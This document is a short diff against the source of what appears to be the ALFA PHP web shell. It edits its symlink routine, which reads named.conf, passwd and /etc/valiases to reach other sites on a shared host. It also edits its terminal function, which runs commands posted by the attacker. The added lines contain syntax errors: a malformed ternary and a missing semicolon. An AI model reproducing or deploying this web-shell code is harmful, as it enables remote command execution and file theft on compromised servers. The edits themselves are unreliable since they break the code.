@@ -4826,7 +4826,7 @@ function alfasymlink() {
             if ($state == "named.conf") {
               if (@strstr($line, 'zone')) {
                 preg_match_all('#zone "(.*)"#', $line, $data);
-                $domain = $data[1][0];
+                $domain = isset($data[1][0])?$data[1][0]?' ';
               } else {
                 continue;
               }
@@ -4839,7 +4839,10 @@ function alfasymlink() {
               }
               $domain = $line;
             }
-            if (strlen(trim($domain)) > 2 && $state != "passwd") {
+            if(isset($domain)){
+            	$domain=trim($domain);
+            }
+            if (strlen($domain)> 2 && $state != "passwd") {
               if (!_alfa_file_exists('/etc/valiases/'.$domain, false)) {
                 continue;
               }
@@ -6786,6 +6789,7 @@ if (!function_exists('json_decode')) {
   }
 }
 function alfaterminalExec() {
+  $cmd = '';
   $pwd = "pwd";
   $seperator = ";";
   if ($GLOBALS['sys'] != 'unix') {
@@ -6800,7 +6804,7 @@ function alfaterminalExec() {
     if (empty($match[1])) {
       $match[1] = $match[2];
     }
-    $current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd);
+    $current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd)
     $current_path = str_replace("\\", "/", $current_path);
   }
   $out = alfaEx($cmd.$_POST['alfa1'], true);
